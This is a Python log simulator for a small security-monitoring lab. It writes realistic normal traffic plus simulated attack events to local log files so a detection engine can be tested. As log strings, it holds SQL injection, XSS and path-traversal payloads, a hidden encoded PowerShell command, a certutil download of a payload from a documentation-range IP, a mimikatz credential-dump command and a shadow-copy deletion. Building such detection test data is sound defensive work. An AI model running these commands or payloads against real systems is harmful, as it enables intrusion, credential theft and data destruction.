"""Log simulator: writes realistic normal traffic plus attack scenarios.

Produces three log files the detection engine tails:
  auth.log     - Linux sshd / useradd style lines
  web.log      - web server access log
  process.log  - Windows process-creation events (JSON lines, Sysmon-like)

Attacker IPs use the reserved documentation ranges (203.0.113.0/24,
198.51.100.0/24) so nothing here points at a real host.
"""
import argparse
import json
import os
import random
import threading
import time
from datetime import datetime

INTERNAL_IPS = [f"10.0.0.{i}" for i in range(10, 30)]
ATTACKER_IPS = [f"203.0.113.{i}" for i in range(5, 60)] + [f"198.51.100.{i}" for i in range(5, 60)]
USERS = ["alice", "bob", "carol", "dave"]
NORMAL_PATHS = ["/", "/about", "/login", "/products", "/products?id=12", "/static/app.js", "/contact"]
NORMAL_PROCS = [
    ("chrome.exe", "chrome.exe --type=renderer"),
    ("explorer.exe", "C:\\Windows\\explorer.exe"),
    ("notepad.exe", "notepad.exe C:\\Users\\bob\\notes.txt"),
    ("svchost.exe", "svchost.exe -k netsvcs -p"),
    ("powershell.exe", "powershell.exe Get-ChildItem C:\\Reports"),
]


def _now():
    return datetime.now().isoformat(timespec="seconds")


class LogWriter:
    def __init__(self, log_dir, reset=False):
        os.makedirs(log_dir, exist_ok=True)
        self.paths = {name: os.path.join(log_dir, f"{name}.log") for name in ("auth", "web", "process")}
        self._lock = threading.Lock()
        if reset:
            for p in self.paths.values():
                open(p, "w").close()

    def _write(self, name, line):
        with self._lock, open(self.paths[name], "a", encoding="utf-8") as f:
            f.write(line + "\n")

    def auth(self, prog, msg, host="web-01"):
        pid = random.randint(1000, 9999)
        self._write("auth", f"{_now()} {host} {prog}[{pid}]: {msg}")

    def web(self, ip, path, status, method="GET"):
        size = random.randint(200, 9000)
        self._write("web", f'{ip} - - [{_now()}] "{method} {path} HTTP/1.1" {status} {size}')

    def process(self, user, image, cmdline, parent="explorer.exe", host="WIN-01"):
        event = {"ts": _now(), "host": host, "user": user, "image": image, "cmdline": cmdline, "parent": parent}
        self._write("process", json.dumps(event))


# ---------------- attack scenarios ----------------

def brute_force(w, ip=None, success=True):
    ip = ip or random.choice(ATTACKER_IPS)
    for _ in range(random.randint(6, 10)):
        user = random.choice(["root", "admin", "test", "oracle"])
        w.auth("sshd", f"Failed password for {user} from {ip} port {random.randint(30000, 60000)} ssh2")
        time.sleep(0.05)
    if success:
        w.auth("sshd", f"Accepted password for admin from {ip} port {random.randint(30000, 60000)} ssh2")


def sql_injection(w, ip=None):
    ip = ip or random.choice(ATTACKER_IPS)
    for p in ["/products?id=1'%20OR%20'1'='1", "/products?id=1%20UNION%20SELECT%20username,password%20FROM%20users"]:
        w.web(ip, p, 500)


def path_traversal(w, ip=None):
    w.web(ip or random.choice(ATTACKER_IPS), "/download?file=../../../../etc/passwd", 403)


def xss(w, ip=None):
    w.web(ip or random.choice(ATTACKER_IPS), "/search?q=%3Cscript%3Ealert(1)%3C/script%3E", 200)


def dir_scan(w, ip=None):
    ip = ip or random.choice(ATTACKER_IPS)
    for word in ["admin", "backup", ".git", "wp-admin", "phpmyadmin", "config", "old", "test", "db",
                 "uploads", "private", "secret", "api", "dev", "staging", "logs", "tmp", "cgi-bin"]:
        w.web(ip, f"/{word}", 404)


def encoded_powershell(w):
    w.process("bob", "powershell.exe", "powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
              parent="winword.exe")


def certutil_download(w):
    w.process("bob", "certutil.exe", "certutil.exe -urlcache -split -f http://198.51.100.7/payload.exe C:\\Temp\\p.exe",
              parent="cmd.exe")


def credential_dump(w):
    w.process("SYSTEM", "mimikatz.exe", "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit", parent="cmd.exe")


def shadow_delete(w):
    w.process("SYSTEM", "vssadmin.exe", "vssadmin.exe delete shadows /all /quiet", parent="cmd.exe")


def discovery(w):
    w.process("bob", "whoami.exe", "whoami /priv", parent="cmd.exe")


def new_user(w):
    w.auth("useradd", "new user: name=svc_backup, UID=1050, GID=1050, home=/home/svc_backup, shell=/bin/bash")


SCENARIOS = {
    "brute_force": brute_force,
    "sql_injection": sql_injection,
    "path_traversal": path_traversal,
    "xss": xss,
    "dir_scan": dir_scan,
    "encoded_powershell": encoded_powershell,
    "certutil_download": certutil_download,
    "credential_dump": credential_dump,
    "shadow_delete": shadow_delete,
    "discovery": discovery,
    "new_user": new_user,
}


def normal_traffic(w):
    choice = random.random()
    if choice < 0.4:
        w.web(random.choice(INTERNAL_IPS), random.choice(NORMAL_PATHS), random.choice([200, 200, 200, 304, 404]))
    elif choice < 0.6:
        w.auth("sshd", f"Accepted publickey for {random.choice(USERS)} from {random.choice(INTERNAL_IPS)} port 22 ssh2")
    elif choice < 0.63:  # occasional typo by a real user: rare enough not to look like brute force
        w.auth("sshd", f"Failed password for {random.choice(USERS)} from {random.choice(INTERNAL_IPS)} port 22 ssh2")
    else:
        image, cmd = random.choice(NORMAL_PROCS)
        w.process(random.choice(USERS), image, cmd)


def run_forever(log_dir, attack_every=(6, 12), stop=None, reset=True):
    w = LogWriter(log_dir, reset=reset)
    next_attack = time.time() + random.uniform(*attack_every)
    while not (stop and stop.is_set()):
        normal_traffic(w)
        if time.time() >= next_attack:
            name = random.choice(list(SCENARIOS))
            SCENARIOS[name](w)
            print(f"[simulator] launched scenario: {name}")
            next_attack = time.time() + random.uniform(*attack_every)
        time.sleep(random.uniform(0.2, 0.6))


def main():
    ap = argparse.ArgumentParser(description="MiniSOC log simulator")
    ap.add_argument("--logs", default="logs", help="directory to write logs into")
    ap.add_argument("--scenario", choices=sorted(SCENARIOS), help="run one attack scenario and exit")
    ap.add_argument("--no-reset", action="store_true", help="append to existing logs instead of clearing them")
    args = ap.parse_args()
    if args.scenario:
        SCENARIOS[args.scenario](LogWriter(args.logs))
        print(f"[simulator] wrote scenario: {args.scenario}")
        return
    try:
        run_forever(args.logs, reset=not args.no_reset)
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
